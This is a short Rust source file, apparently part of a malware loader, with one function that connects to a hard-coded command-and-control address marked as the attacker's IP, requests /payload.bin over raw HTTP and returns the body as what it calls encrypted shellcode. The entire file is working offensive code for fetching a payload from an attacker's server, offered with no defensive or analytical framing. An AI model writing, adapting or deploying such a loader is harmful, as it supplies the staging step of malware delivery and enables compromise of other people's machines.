use std::io::{Read, Write};
use std::net::TcpStream;

/// Fetches encrypted shellcode from an HTTP server
pub fn fetch_encrypted_payload() -> Vec<u8> {
    let server_ip = "10.0.0.86:8080"; // Change this to your attacker's IP
    let payload_path = "/payload.bin";
    
    let mut stream = TcpStream::connect(server_ip).expect("Failed to connect to C2 server");

    // Send an HTTP GET request
    let request = format!("GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", payload_path, server_ip);
    stream.write_all(request.as_bytes()).expect("Failed to send HTTP request");

    // Read the response
    let mut response = Vec::new();
    stream.read_to_end(&mut response).expect("Failed to read response");

    // Strip HTTP headers
    let payload_start = response.windows(4).position(|w| w == b"\r\n\r\n").unwrap_or(0) + 4;
    response[payload_start..].to_vec() // Return only the binary payload
}